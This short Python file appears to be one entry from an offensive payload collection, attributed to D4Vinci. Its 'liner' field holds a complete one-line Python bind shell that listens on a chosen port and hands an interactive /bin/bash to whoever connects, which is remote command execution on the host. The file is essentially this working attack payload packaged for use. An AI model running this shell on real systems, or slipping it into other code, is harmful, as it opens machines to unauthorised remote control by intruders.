class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Use python socket module and subprocess to establish bind shell on specifed port."
    function    = "bind shell"
    liner     = """python -c "import socket,subprocess,os;VAR1=socket.socket(socket.AF_INET,socket.SOCK_STREAM);VAR1.bind(('',PORT));VAR1.listen(1);conn,addr=VAR1.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);VAR2=subprocess.call(['/bin/bash','-i'])" """
